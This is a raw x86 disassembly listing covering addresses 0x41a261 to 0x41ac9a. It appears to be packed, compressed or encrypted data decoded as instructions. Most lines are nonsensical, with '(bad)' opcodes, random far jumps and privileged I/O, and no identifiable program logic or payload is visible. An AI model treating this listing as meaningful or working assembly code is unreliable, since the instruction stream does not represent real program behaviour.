  41a261:	sbb    BYTE PTR [edx+0x39],dl
  41a264:	cs dec eax
  41a266:	xchg   ecx,eax
  41a267:	int    0x33
  41a269:	adc    al,0x22
  41a26b:	aaa    
  41a26c:	sbb    al,0x0
  41a26e:	add    BYTE PTR [eax],0xea
  41a271:	mov    ebp,0x22e30a26
  41a276:	imul   eax,DWORD PTR [edi-0x4d29814b],0x43f1132e
  41a280:	mov    bh,0x75
  41a282:	ins    BYTE PTR es:[edi],dx
  41a283:	mov    esp,esi
  41a285:	div    BYTE PTR [edx+0x3fe21ed8]
  41a28b:	jl     0x41a24d
  41a28d:	ss aad 0x60
  41a290:	push   es
  41a291:	repnz mov esi,0xf4697a3e
  41a297:	das    
  41a298:	push   ebx
  41a299:	(bad)  
  41a29a:	in     eax,dx
  41a29b:	lea    edx,[eax]
  41a29d:	xchg   BYTE PTR [ecx],cl
  41a29f:	jbe    0x41a25b
  41a2a1:	(bad)  
  41a2a3:	xchg   edx,eax
  41a2a4:	inc    edx
  41a2a5:	ja     0x41a2af
  41a2a7:	std    
  41a2a8:	pop    edi
  41a2a9:	arpl   WORD PTR [eax+0x63ea5de8],ax
  41a2af:	rcr    BYTE PTR [esi],1
  41a2b1:	dec    edi
  41a2b2:	cmp    BYTE PTR [esi+0x4a225148],cl
  41a2b8:	retf   0xd4ca
  41a2bb:	pop    ss
  41a2bc:	outs   dx,BYTE PTR ds:[esi]
  41a2bd:	mov    ecx,0x22a75768
  41a2c2:	mov    ds,WORD PTR [ecx+0x43]
  41a2c5:	fwait
  41a2c6:	test   al,0x15
  41a2c8:	xchg   esi,eax
  41a2c9:	jmp    0x41a2c3
  41a2cb:	xchg   BYTE PTR [esi+eiz*8],cl
  41a2ce:	jp     0x41a27a
  41a2d0:	jnp    0x41a260
  41a2d2:	sbb    bl,BYTE PTR [esi]
  41a2d4:	ret    
  41a2d5:	mov    edx,0x83947d5e
  41a2da:	adc    DWORD PTR [edx-0x34],0x3b05d73d
  41a2e1:	adc    eax,0x5db6b59f
  41a2e6:	das    
  41a2e7:	xchg   ebx,eax
  41a2e8:	inc    ebp
  41a2e9:	pop    ebp
  41a2ea:	scas   al,BYTE PTR es:[edi]
  41a2eb:	jne    0x41a349
  41a2ed:	xor    edx,DWORD PTR fs:[eax+0x2d]
  41a2f1:	test   eax,0x8456ae60
  41a2f6:	pop    ebp
  41a2f7:	sbb    BYTE PTR [ebx-0x1c],bl
  41a2fa:	mov    bl,0x72
  41a2fc:	js     0x41a361
  41a2fe:	mov    DWORD PTR [ebp+0x1e250099],ebp
  41a304:	(bad)  
  41a305:	aas    
  41a306:	or     eax,0x2546de07
  41a30b:	arpl   si,di
  41a30d:	ret    
  41a30e:	hlt    
  41a30f:	popa   
  41a310:	pop    esi
	...
  41a371:	add    BYTE PTR [eax],al
  41a373:	add    bh,dh
  41a375:	pop    eax
  41a376:	test   al,0x13
  41a378:	scas   eax,DWORD PTR es:[edi]
  41a379:	repz (bad) 
  41a37b:	cld    
  41a37c:	adc    eax,0x3ba6955c
  41a381:	neg    BYTE PTR [edi-0x12]
  41a384:	sub    edx,DWORD PTR [esi]
  41a386:	add    DWORD PTR [eax],eax
  41a388:	add    eax,0x37000001
  41a38d:	or     al,0x5a
  41a38f:	cmp    eax,0xcce35860
  41a394:	mov    ebp,0x647f28c9
  41a399:	in     al,dx
  41a39a:	outs   dx,BYTE PTR ds:[esi]
  41a39b:	(bad)  
  41a39c:	in     eax,dx
  41a39d:	mov    ebp,0x54ec441a
  41a3a2:	xor    al,0x6d
  41a3a5:	mov    BYTE PTR [edi-0x41],bh
  41a3a8:	mov    esp,0xaec5b253
  41a3ad:	jne    0x41a398
  41a3af:	sub    al,0x32
  41a3b1:	leave  
  41a3b2:	std    
  41a3b3:	sub    DWORD PTR [eax-0x6a635ea8],ebp
  41a3b9:	imul   edx,DWORD PTR [edx],0x6fe4f005
  41a3bf:	mov    ebx,0x58357c3e
  41a3c4:	mov    edx,0x8efc189f
  41a3c9:	xor    eax,0x7ab21cc2
  41a3ce:	mov    ah,0x5a
  41a3d0:	stos   BYTE PTR es:[edi],al
  41a3d1:	dec    ebp
  41a3d2:	adc    bl,BYTE PTR [edx-0x78]
  41a3d5:	mov    dh,0xfe
  41a3d7:	xchg   esi,eax
  41a3d8:	ss (bad) 
  41a3da:	xlat   BYTE PTR ds:[ebx]
  41a3db:	(bad)  
  41a3dc:	xchg   ecx,eax
  41a3dd:	dec    esp
  41a3de:	outs   dx,DWORD PTR ds:[esi]
  41a3df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a3e0:	inc    eax
  41a3e1:	hlt    
  41a3e2:	cld    
  41a3e3:	sub    eax,0x1ca7229d
  41a3e8:	leave  
  41a3e9:	shl    BYTE PTR [eax+0x67],0x7c
  41a3ed:	jo     0x41a3ee
  41a3ef:	data16 jl 0x41a42f
  41a3f2:	push   eax
  41a3f3:	adc    eax,0x5739439b
  41a3f8:	shr    DWORD PTR [eax+eax*4-0x4cc8d26b],0xf8
  41a400:	imul   ecx,eax,0x3fe1b42d
  41a406:	adc    eax,0x7079d2ec
  41a40b:	cmp    DWORD PTR [edi-0x1e],0xffffffb0
  41a40f:	int3   
  41a410:	xchg   ebp,eax
  41a411:	mov    ecx,DWORD PTR [ecx+0xf5250e6]
  41a417:	cld    
  41a418:	mov    ah,0x62
  41a41a:	bnd data16 jns 0x41a3a5
  41a41e:	pop    eax
  41a41f:	scas   al,BYTE PTR es:[edi]
  41a420:	cs aaa 
  41a422:	jmp    0xf81c:0xbbee1ad0
  41a429:	push   esp
  41a42a:	loop   0x41a3d3
  41a42c:	push   edx
  41a42d:	ret    
  41a42e:	xor    DWORD PTR [edi],eax
  41a430:	or     eax,0x447241eb
  41a435:	lods   eax,DWORD PTR ds:[esi]
  41a436:	jmp    0xfb7d:0xc26b9a61
  41a43d:	adc    edx,0xffffffc4
  41a440:	xchg   DWORD PTR [ebp-0x6e],esp
  41a443:	cmp    edx,DWORD PTR [ebx+eax*2-0x7a]
  41a447:	(bad)  
  41a448:	or     BYTE PTR [eax],ch
  41a44a:	test   BYTE PTR [edx],dl
  41a44c:	sti    
  41a44d:	mov    ?,WORD PTR [edx+0xa341c99]
  41a453:	push   ebp
  41a454:	jo     0x41a46b
  41a456:	and    DWORD PTR ds:0xd0b5390b,esp
  41a45c:	adc    DWORD PTR [ebx+0x5d],0xffffffa3
  41a460:	imul   ebx,DWORD PTR [edi+0x678c9ccb],0x69
  41a467:	ss push 0xffffffc0
  41a46a:	pop    ebx
  41a46b:	sub    edi,DWORD PTR [eax]
  41a46d:	out    0xbc,al
  41a46f:	ja     0x41a3f3
  41a471:	test   DWORD PTR gs:[eax],ebx
  41a474:	ret    0x7bce
  41a477:	shr    DWORD PTR [edx+0x2d],1
  41a47a:	out    0x1c,eax
  41a47c:	addr16 push 0xc2984e4e
  41a482:	mov    esi,0x6deefbf5
  41a487:	sub    eax,0x75d4fdc2
  41a48c:	push   es
  41a48d:	ret    0xfb3b
  41a490:	ins    DWORD PTR es:[edi],dx
	...
  41a4f1:	add    BYTE PTR [eax],al
  41a4f3:	add    BYTE PTR [edi-0xf0307e],bh
  41a4f9:	dec    edi
  41a4fa:	push   DWORD PTR [edx+0x5f4d0d09]
  41a500:	push   0x1b
  41a502:	sub    eax,0x1173023
  41a507:	add    BYTE PTR ds:0x3b000001,al
  41a50d:	or     al,0xf2
  41a50f:	lock xor esp,DWORD PTR [edx]
  41a512:	jge    0x41a539
  41a514:	adc    ch,dl
  41a516:	jle    0x41a54c
  41a518:	inc    ebx
  41a519:	out    dx,al
  41a51a:	and    DWORD PTR [ebx-0x4b12b6d5],ebx
  41a520:	or     al,BYTE PTR [ebx+0x2ae4b336]
  41a526:	mov    cl,0xea
  41a528:	or     al,0x9a
  41a52a:	adc    ah,cl
  41a52c:	shr    DWORD PTR [edx+esi*2-0x34],0xe5
  41a531:	cmc    
  41a532:	lock ds mov cl,0xfa
  41a536:	test   bl,bh
  41a538:	sbb    BYTE PTR [ecx+0x6c],dh
  41a53b:	in     al,0x94
  41a53d:	idiv   DWORD PTR [edi+0x7d]
  41a540:	mov    dl,0xe3
  41a542:	mov    eax,0x8b6a12a2
  41a547:	jle    0x41a4d2
  41a549:	cmp    eax,0x24abcd07
  41a54e:	and    esi,ecx
  41a550:	xchg   ebx,eax
  41a551:	or     DWORD PTR [eax-0x4c14b200],ebp
  41a557:	push   es
  41a558:	dec    eax
  41a559:	cmp    DWORD PTR [edi],0x4efa64a5
  41a55f:	pop    edi
  41a560:	or     al,dl
  41a562:	sbb    BYTE PTR [eax],dl
  41a564:	jae    0x41a590
  41a566:	xor    eax,0x4c0aa6bf
  41a56b:	inc    ecx
  41a56c:	sub    esi,DWORD PTR [edi-0x4f5bd646]
  41a572:	mov    bl,0xf1
  41a574:	imul   esi,DWORD PTR ds:0x3dfb31b2,0xf653af3f
  41a57e:	xchg   ecx,eax
  41a57f:	fnstsw WORD PTR [ebx+0x232ebc15]
  41a585:	mov    ebx,0xad3852bb
  41a58a:	push   ds
  41a58b:	and    esp,0xdd599ea4
  41a591:	pushf  
  41a592:	sbb    cl,ah
  41a594:	add    eax,0x68bec351
  41a599:	popf   
  41a59a:	sub    al,0x20
  41a59c:	xor    dl,BYTE PTR [eax]
  41a59e:	push   eax
  41a59f:	and    BYTE PTR [eax+0x65fdcd4a],0xe6
  41a5a6:	mov    eax,0x2382406d
  41a5ab:	dec    eax
  41a5ac:	in     eax,dx
  41a5ad:	ins    DWORD PTR es:[edi],dx
  41a5ae:	div    DWORD PTR [edi]
  41a5b0:	push   edi
  41a5b1:	pop    edi
  41a5b2:	gs mov esp,0x718aa28b
  41a5b8:	test   al,0x76
  41a5ba:	cmp    al,0xbd
  41a5bc:	std    
  41a5bd:	out    dx,al
  41a5be:	dec    ebp
  41a5bf:	inc    eax
  41a5c0:	mov    ds:0xade43e6,eax
  41a5c5:	push   ebx
  41a5c6:	inc    esi
  41a5c7:	inc    ebp
  41a5c8:	rol    DWORD PTR [edx-0x4c],cl
  41a5cb:	inc    eax
  41a5cc:	repz mov al,0x2
  41a5cf:	shr    DWORD PTR [edi],1
  41a5d1:	dec    ebx
  41a5d2:	sbb    ecx,DWORD PTR [ecx+0x4a]
  41a5d5:	and    dl,ch
  41a5d7:	jmp    0xc33f1faf
  41a5dc:	jle    0x41a65d
  41a5de:	icebp  
  41a5df:	fwait
  41a5e0:	sub    eax,0xd0edb4fc
  41a5e5:	xchg   esp,eax
  41a5e6:	cdq    
  41a5e7:	je     0x41a5b4
  41a5e9:	mov    esi,0x2d782e14
  41a5ee:	arpl   WORD PTR [ebp+0xf0ec98a],bx
  41a5f4:	repz xor ch,0xc
  41a5f8:	cmp    edi,DWORD PTR [esi+0x3b2ede1b]
  41a5fe:	xor    ah,BYTE PTR [ebp-0xc9cc8a3]
  41a604:	test   ebp,edi
  41a606:	jnp    0x41a65a
  41a608:	xor    eax,0x24e6032
  41a60d:	rcl    DWORD PTR [esp+eax*8+0x7],cl
	...
  41a671:	add    BYTE PTR [eax],al
  41a673:	add    BYTE PTR [edx+ebp*1+0x1],bl
  41a677:	inc    ecx
  41a678:	ja     0x41a6e5
  41a67a:	pop    esp
  41a67b:	aas    
  41a67c:	dec    ecx
  41a67d:	push   0x2b87a625
  41a682:	xchg   edi,eax
  41a683:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a684:	xor    eax,0x5000118
  41a689:	add    DWORD PTR [eax],eax
  41a68b:	add    dh,ch
  41a68d:	nop
  41a68e:	jmp    0x8e33adee
  41a693:	fdiv   QWORD PTR [eax-0x5d59cd78]
  41a699:	add    bh,dh
  41a69b:	pop    edi
  41a69c:	mov    edi,0xfd6fa7fa
  41a6a1:	loopne 0x41a6dd
  41a6a3:	fadd   DWORD PTR [eax]
  41a6a5:	mov    ecx,0xe0312372
  41a6aa:	jne    0x41a729
  41a6ac:	inc    ebx
  41a6ad:	jbe    0x41a711
  41a6af:	mov    ecx,DWORD PTR [ecx+ebp*1-0x19]
  41a6b3:	(bad)  
  41a6b4:	jne    0x41a664
  41a6b6:	jle    0x41a6a7
  41a6b8:	in     al,0x9c
  41a6ba:	mov    ecx,0x2e99d91f
  41a6bf:	cdq    
  41a6c0:	xchg   ebp,eax
  41a6c1:	shl    ecx,0x34
  41a6c4:	add    DWORD PTR [eax],0xffffffea
  41a6c7:	fwait
  41a6c8:	and    al,0x3
  41a6ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a6cb:	cdq    
  41a6cc:	push   edx
  41a6cd:	int3   
  41a6ce:	outs   dx,BYTE PTR ds:[esi]
  41a6cf:	xchg   edx,eax
  41a6d0:	ins    BYTE PTR es:[edi],dx
  41a6d1:	lea    esp,[edx+ebp*1-0x74]
  41a6d5:	std    
  41a6d6:	jmp    0xef6a:0x71e5c3e8
  41a6dd:	jle    0x41a737
  41a6df:	dec    ecx
  41a6e0:	sbb    bl,ah
  41a6e2:	retf   0xd4b5
  41a6e5:	lahf   
  41a6e6:	xor    al,0xf2
  41a6e8:	mov    ecx,0x5f651c2b
  41a6ed:	mov    dl,0x12
  41a6ef:	pop    edx
  41a6f0:	adc    al,0xb5
  41a6f2:	jle    0x41a6c8
  41a6f4:	push   esi
  41a6f5:	jne    0x41a701
  41a6f7:	test   DWORD PTR [ecx+0x44e61b09],esi
  41a6fd:	add    DWORD PTR [eax+0x52bfe213],0xc25f6260
  41a707:	xor    BYTE PTR [eax+ebx*2+0x174e1b53],ch
  41a70e:	xor    ah,dh
  41a710:	pop    ss
  41a711:	jno    0x41a73d
  41a713:	(bad)  
  41a714:	fwait
  41a715:	mov    ebp,0xcc3dafe9
  41a71a:	pop    edi
  41a71b:	jo     0x41a6b7
  41a71d:	add    al,0x74
  41a71f:	jle    0x41a726
  41a721:	loop   0x41a771
  41a723:	add    eax,0x3c47f46d
  41a728:	add    al,0x14
  41a72a:	sysexit 
  41a72c:	xor    al,0x23
  41a72e:	jmp    0xc91a:0x92590bcc
  41a735:	xchg   edi,eax
  41a736:	imul   eax
  41a738:	adc    esi,DWORD PTR [edx-0x38]
  41a73b:	popf   
  41a73c:	mov    BYTE PTR [esi-0x3f],dl
  41a73f:	es sbb al,0x7c
  41a742:	jo     0x41a781
  41a744:	mov    ss,WORD PTR [ebx+0x7a]
  41a747:	push   ds
  41a748:	aam    0xda
  41a74a:	push   ebp
  41a74b:	pusha  
  41a74c:	(bad)  
  41a74d:	aad    0x37
  41a74f:	pop    eax
  41a750:	popa   
  41a751:	xor    DWORD PTR [esi+0x4c],ecx
  41a754:	lods   eax,DWORD PTR ds:[esi]
  41a755:	cdq    
  41a756:	jns    0x41a778
  41a758:	sbb    BYTE PTR [ebx],bl
  41a75a:	inc    eax
  41a75b:	sbb    ebx,DWORD PTR [eax-0x6e]
  41a75e:	xor    eax,0xfa7c54c9
  41a763:	pop    esi
  41a764:	shl    DWORD PTR [ebx],cl
  41a766:	cmp    esi,DWORD PTR [edx+0x28fb66d7]
  41a76c:	mov    ds:0xfb72ed6d,eax
  41a771:	aas    
  41a772:	test   DWORD PTR [eax-0x50],ebp
  41a775:	or     BYTE PTR [eax-0x46c3ec82],0xe3
  41a77c:	xchg   DWORD PTR [esi+0x4f],edx
  41a77f:	sahf   
  41a780:	fmul   QWORD PTR [ebx+edi*2]
  41a783:	push   ebp
  41a784:	scas   eax,DWORD PTR es:[edi]
  41a785:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a786:	pop    gs
  41a788:	pop    ebp
  41a789:	or     al,BYTE PTR [ecx-0x63]
  41a78c:	or     ebp,ebp
  41a78e:	jne    0x41a726
  41a790:	cli    
	...
  41a7f1:	add    BYTE PTR [eax],al
  41a7f3:	add    bl,dh
  41a7f5:	xchg   edi,eax
  41a7f6:	jae    0x41a77f
  41a7f8:	ja     0x41a7e1
  41a7fa:	div    edi
  41a7fc:	mov    ds:0xb45327ca,al
  41a801:	test   DWORD PTR [ebp+0x1193a46],edi
  41a807:	add    BYTE PTR ds:0x24000001,al
  41a80d:	dec    eax
  41a80e:	push   ds
  41a80f:	leave  
  41a810:	adc    edx,ecx
  41a812:	add    al,BYTE PTR [edx+0x3a]
  41a815:	adc    DWORD PTR [ecx],ebx
  41a817:	loope  0x41a880
  41a819:	js     0x41a899
  41a81b:	pop    eax
  41a81c:	mov    bh,0x51
  41a81e:	bound  edi,QWORD PTR ss:[ebx]
  41a821:	jmp    0x41a89d
  41a823:	xchg   edi,eax
  41a824:	je     0x41a854
  41a826:	retf   
  41a827:	ret    
  41a828:	sub    BYTE PTR [ebp-0x55702b8],bl
  41a82e:	inc    DWORD PTR [ecx]
  41a830:	arpl   WORD PTR [esi-0x3013ea10],di
  41a836:	ins    BYTE PTR es:[edi],dx
  41a837:	retf   0x7e1b
  41a83a:	mov    ecx,0x5ba50032
  41a83f:	dec    ebp
  41a840:	mov    al,ds:0x96869317
  41a845:	dec    edi
  41a846:	sbb    BYTE PTR [eax+0x26],ah
  41a849:	stos   DWORD PTR es:[edi],eax
  41a84a:	xor    al,0xe3
  41a84c:	outs   dx,BYTE PTR ds:[esi]
  41a84d:	mov    al,ds:0xdb8e9495
  41a852:	shl    DWORD PTR [ecx-0x49d7867e],1
  41a858:	loop   0x41a86d
  41a85a:	mov    ecx,0xbd58d654
  41a85f:	mov    edi,0xae1a255b
  41a864:	xchg   cl,bl
  41a866:	jle    0x41a814
  41a868:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a869:	or     eax,0x5e410732
  41a86e:	mov    al,0x5d
  41a870:	hlt    
  41a871:	pop    ds
  41a872:	mov    eax,0x2d7d5c8d
  41a877:	mov    ds,WORD PTR [ecx-0xf]
  41a87a:	out    0x5f,al
  41a87c:	push   ds
  41a87d:	test   eax,0x478bccc3
  41a882:	aaa    
  41a883:	test   eax,0xd3311176
  41a888:	jae    0x41a8b5
  41a88a:	ins    DWORD PTR es:[edi],dx
  41a88b:	mov    BYTE PTR [esi+0x35],ch
  41a88e:	aaa    
  41a88f:	inc    ecx
  41a890:	lods   eax,DWORD PTR ds:[esi]
  41a891:	stos   DWORD PTR es:[edi],eax
  41a892:	lahf   
  41a893:	sti    
  41a894:	mov    edx,0x3aae5ed3
  41a899:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a89a:	mov    BYTE PTR [esi],dh
  41a89c:	rcl    esp,0xb6
  41a89f:	mov    ebx,0xb693d1bf
  41a8a4:	add    DWORD PTR [esi],esi
  41a8a6:	(bad)  
  41a8a7:	xor    bh,ah
  41a8a9:	clc    
  41a8aa:	jecxz  0x41a85f
  41a8ac:	sahf   
  41a8ad:	fwait
  41a8ae:	add    eax,0x632b1fe1
  41a8b3:	jo     0x41a8e3
  41a8b5:	xchg   DWORD PTR [edx+ebp*2+0x6461f9aa],ebx
  41a8bc:	cdq    
  41a8bd:	sub    cl,BYTE PTR [edx+0x2540408d]
  41a8c3:	xor    BYTE PTR [eax+0x1c],dl
  41a8c6:	lea    esp,[edx+0x6b999da2]
  41a8cc:	fadd   QWORD PTR [ebp+ebx*4+0x60bbfa78]
  41a8d3:	repnz ror BYTE PTR [edx],0xac
  41a8d7:	mov    dh,0x8c
  41a8da:	or     ebx,DWORD PTR [edx]
  41a8dc:	mov    WORD PTR [ebp+0x16ab0714],cs
  41a8e2:	jo     0x41a885
  41a8e4:	inc    ecx
  41a8e5:	cmp    al,0x4c
  41a8e7:	mov    dh,0x7f
  41a8e9:	pop    ss
  41a8ea:	sbb    BYTE PTR [eax-0x70dde728],cl
  41a8f0:	inc    edi
  41a8f1:	pusha  
  41a8f2:	cmp    DWORD PTR [ebx-0x6cbeb6e0],ecx
  41a8f8:	cli    
  41a8f9:	out    dx,al
  41a8fa:	test   DWORD PTR [esi+0x329a5c9d],ebx
  41a900:	pop    es
  41a901:	cs gs mov bl,0x41
  41a905:	or     BYTE PTR [esi],dh
  41a907:	repnz mov al,0xf9
  41a90a:	sub    eax,0xb8cb050a
  41a90f:	inc    ebx
  41a910:	pop    DWORD PTR [eax]
	...
  41a972:	add    BYTE PTR [eax],al
  41a974:	xor    eax,0xcf4a867e
  41a979:	cli    
  41a97a:	std    
  41a97b:	jg     0x41a9cb
  41a97d:	push   edx
  41a97e:	pushf  
  41a97f:	dec    esp
  41a980:	xchg   edx,eax
  41a981:	shl    BYTE PTR [edi],0x8f
  41a984:	aas    
  41a985:	sbb    al,BYTE PTR [ecx]
  41a987:	add    BYTE PTR ds:0x65000001,al
  41a98d:	aad    0xe8
  41a98f:	(bad)  
  41a990:	push   ds
  41a991:	cmp    al,0xd8
  41a993:	ss cmc 
  41a995:	ret    0x2c4a
  41a998:	ror    DWORD PTR [ecx+0x7e5be9a3],1
  41a99e:	mov    WORD PTR [edi],?
  41a9a0:	and    dh,cl
  41a9a2:	pop    esi
  41a9a3:	das    
  41a9a4:	test   BYTE PTR [ebx+0x5ce264a6],ah
  41a9aa:	jns    0x41a961
  41a9ac:	(bad)  
  41a9ad:	in     eax,dx
  41a9ae:	fwait
  41a9af:	adc    dh,BYTE PTR [eax]
  41a9b1:	fld    TBYTE PTR ss:[esi-0x47d4f1b5]
  41a9b8:	rcr    BYTE PTR [ecx],cl
  41a9ba:	test   DWORD PTR [eax+eiz*1-0x72c75ee3],ebp
  41a9c1:	scas   eax,DWORD PTR es:[edi]
  41a9c2:	or     ah,BYTE PTR [edi]
  41a9c4:	ins    DWORD PTR es:[edi],dx
  41a9c5:	aam    0xae
  41a9c7:	nop
  41a9c8:	(bad)  
  41a9c9:	(bad)  
  41a9ca:	and    bh,BYTE PTR [ebx+0x4b975710]
  41a9d0:	in     al,0x94
  41a9d2:	jae    0x41a9ca
  41a9d4:	out    dx,eax
  41a9d5:	mov    ebp,0xbe33c543
  41a9da:	mov    esp,0x8dba77a8
  41a9df:	push   cs
  41a9e0:	test   DWORD PTR [esi],0xc2f52f22
  41a9e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a9e7:	dec    edi
  41a9e8:	mov    al,0x3
  41a9ea:	inc    ebx
  41a9eb:	mov    cl,0x14
  41a9ed:	lock jge 0x41aa4c
  41a9f0:	sub    bh,al
  41a9f2:	dec    ebp
  41a9f3:	test   eax,0x630f845a
  41a9f8:	jecxz  0x41aa0b
  41a9fa:	fisttp WORD PTR [eax+0x7e21a4f7]
  41aa00:	dec    edx
  41aa01:	mov    eax,0x646ad73e
  41aa06:	enter  0x81fa,0xe3
  41aa0a:	sub    DWORD PTR ds:0xcc13e57a,0xf
  41aa11:	cmp    bh,BYTE PTR [esi]
  41aa13:	push   eax
  41aa14:	jne    0x41aa24
  41aa16:	ins    DWORD PTR es:[edi],dx
  41aa17:	pop    edi
  41aa18:	test   eax,0x20af08dc
  41aa1d:	jne    0x41aa21
  41aa1f:	sti    
  41aa20:	or     ch,BYTE PTR [esi-0xad0a113]
  41aa26:	das    
  41aa27:	(bad)  
  41aa28:	xor    esp,DWORD PTR [ebx+0x11]
  41aa2b:	jns    0x41aa88
  41aa2d:	dec    esp
  41aa2e:	sub    al,0xeb
  41aa30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa31:	int    0x15
  41aa33:	push   esp
  41aa34:	(bad)  
  41aa36:	mov    edi,0x9636c722
  41aa3b:	push   ecx
  41aa3c:	mov    al,ds:0xd30dda6f
  41aa41:	xchg   esp,eax
  41aa42:	popa   
  41aa43:	bound  edx,QWORD PTR [ebx+0x63fb149e]
  41aa49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa4a:	push   ecx
  41aa4b:	stos   DWORD PTR es:[edi],eax
  41aa4c:	dec    ebx
  41aa4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa4e:	icebp  
  41aa4f:	mov    ebx,0x806987d
  41aa54:	iret   
  41aa55:	not    BYTE PTR ds:0x484ca877
  41aa5b:	repz xlat BYTE PTR ds:[ebx]
  41aa5d:	mov    bl,0x93
  41aa5f:	add    esi,DWORD PTR [ecx+0x6d13203]
  41aa65:	mov    DWORD PTR [esi],ebx
  41aa67:	pop    esi
  41aa68:	jmp    0x41aa14
  41aa6a:	test   BYTE PTR [edi-0x374bf800],bl
  41aa70:	fs pop ds
  41aa72:	popa   
  41aa73:	adc    BYTE PTR ds:0xb599bbb2,ah
  41aa79:	and    eax,0x9f9aa85b
  41aa7e:	js     0x41aa94
  41aa80:	(bad)  
  41aa82:	xor    ebx,0xb74f258c
  41aa88:	mov    ah,0xc4
  41aa8a:	pop    ds
  41aa8b:	repz stc 
  41aa8d:	dec    ebx
  41aa8e:	mov    edx,DWORD PTR [ebx]
  41aa90:	in     al,0x0
	...
  41aaf2:	add    BYTE PTR [eax],al
  41aaf4:	test   DWORD PTR [ecx],0xfdfeb4dc
  41aafa:	inc    DWORD PTR [ebx+0x5f]
  41aafd:	sbb    BYTE PTR [esi+0x43],ah
  41ab00:	mov    dh,0x25
  41ab02:	inc    ebx
  41ab03:	repz inc esp
  41ab05:	sbb    eax,DWORD PTR [ecx]
  41ab07:	add    BYTE PTR ds:0xf8000001,al
  41ab0d:	lods   eax,DWORD PTR ds:[esi]
  41ab0e:	mov    bh,0x5
  41ab10:	lods   al,BYTE PTR ds:[esi]
  41ab11:	das    
  41ab12:	cmp    eax,0x979c599b
  41ab17:	push   ebx
  41ab18:	test   DWORD PTR [esi],esi
  41ab1a:	mov    ah,0xc7
  41ab1c:	pop    es
  41ab1d:	dec    edi
  41ab1e:	jb     0x41ab36
  41ab20:	sahf   
  41ab21:	gs xor al,ch
  41ab24:	mov    ds:0xb5ec36fd,eax
  41ab29:	test   eax,0x97dced59
  41ab2e:	xor    eax,0x797b9fff
  41ab33:	sub    BYTE PTR [ebp+ebx*2-0x71e88aa],0x71
  41ab3b:	pusha  
  41ab3c:	aad    0x6c
  41ab3e:	cmovle edi,DWORD PTR [ecx+0x7f]
  41ab42:	jle    0x41ab24
  41ab44:	dec    ebp
  41ab45:	rol    DWORD PTR [esi+edi*2-0x7a],cl
  41ab49:	and    al,0xba
  41ab4b:	sbb    BYTE PTR [ecx-0x4129baf1],0xb7
  41ab52:	pushf  
  41ab53:	sbb    al,0x9f
  41ab55:	or     al,0xb7
  41ab57:	je     0x41ab80
  41ab59:	fdivr  QWORD PTR [eax]
  41ab5b:	mov    al,ds:0x30d6063a
  41ab60:	shr    BYTE PTR [ebx+0xd483ec0],cl
  41ab66:	mov    dl,0xb3
  41ab68:	sbb    BYTE PTR [esi+ecx*1],ch
  41ab6b:	xchg   ecx,eax
  41ab6c:	mov    bh,BYTE PTR [esi]
  41ab6e:	lock fs pop edx
  41ab71:	jmp    0xb6e7f447
  41ab76:	stos   DWORD PTR es:[edi],eax
  41ab77:	fild   QWORD PTR [edx+0x1]
  41ab7a:	xchg   edi,eax
  41ab7b:	call   0x637b:0xe8983877
  41ab82:	push   ds
  41ab83:	xor    ah,BYTE PTR [ebx]
  41ab85:	pop    ds
  41ab86:	add    ebx,DWORD PTR [ebx+0x25]
  41ab89:	inc    ebx
  41ab8a:	enter  0x40d2,0xd3
  41ab8e:	cmp    esi,DWORD PTR [ecx+esi*1]
  41ab91:	inc    edx
  41ab92:	popf   
  41ab93:	pop    esi
  41ab94:	jo     0x41ab8f
  41ab96:	call   0x8feb:0x1df18311
  41ab9d:	push   esi
  41ab9e:	or     ebx,0xb6e1d39e
  41aba4:	sahf   
  41aba5:	fidivr WORD PTR [eax+0x5e]
  41aba8:	sbb    bh,dh
  41abaa:	adc    BYTE PTR [eax],bh
  41abac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41abad:	retf   
  41abae:	xor    al,BYTE PTR [ecx-0x40]
  41abb1:	or     eax,0x445bc89f
  41abb6:	sub    ebx,DWORD PTR [ebp-0x1b]
  41abb9:	arpl   WORD PTR [edx+0x61],di
  41abbc:	lods   al,BYTE PTR ds:[esi]
  41abbd:	sar    BYTE PTR [ebx],cl
  41abbf:	and    eax,0x13decdec
  41abc4:	gs mov cl,0xd4
  41abc8:	xor    esi,eax
  41abca:	enter  0x99e4,0x4b
  41abce:	fsubrp st(2),st
  41abd0:	loop   0x41ac32
  41abd2:	int    0xb
  41abd4:	sub    eax,DWORD PTR ds:0x2db04814
  41abda:	fs enter 0xc95b,0xb1
  41abdf:	jno    0x41aba1
  41abe1:	xchg   bh,dl
  41abe3:	iret   
  41abe4:	and    BYTE PTR [ebx+0x25],bh
  41abe7:	js     0x41ac4f
  41abe9:	push   ecx
  41abea:	add    eax,0x40c99850
  41abef:	adc    eax,0xcfeb52d
  41abf4:	(bad)  
  41abf5:	pushf  
  41abf6:	gs cwde 
  41abf8:	push   ss
  41abf9:	pop    edx
  41abfa:	inc    esi
  41abfb:	dec    ecx
  41abfc:	out    dx,al
  41abfd:	jle    0x41abac
  41abff:	test   DWORD PTR [edi+edi*2-0x77],ebp
  41ac03:	test   eax,0xe7f5d11b
  41ac08:	or     DWORD PTR [ebx+0x45805e4f],eax
  41ac0e:	jmp    0x41f40f
	...
  41ac73:	add    BYTE PTR [edx+0x49],ch
  41ac76:	es cmp al,0x27
  41ac79:	jg     0x41acf5
  41ac7b:	pop    edi
  41ac7c:	or     al,0x44
  41ac7e:	xor    ah,BYTE PTR [esi+esi*4-0x68]
  41ac82:	lods   al,BYTE PTR ds:[esi]
  41ac83:	mov    DWORD PTR [ecx+0x1c],ecx
  41ac86:	add    DWORD PTR [eax],eax
  41ac88:	add    eax,0xb4000001
  41ac8d:	mov    ebx,0xb8182acb
  41ac92:	inc    esi
  41ac93:	fbld   TBYTE PTR [eax+edi*4-0x1525c197]
  41ac9a:	out    0x12,al
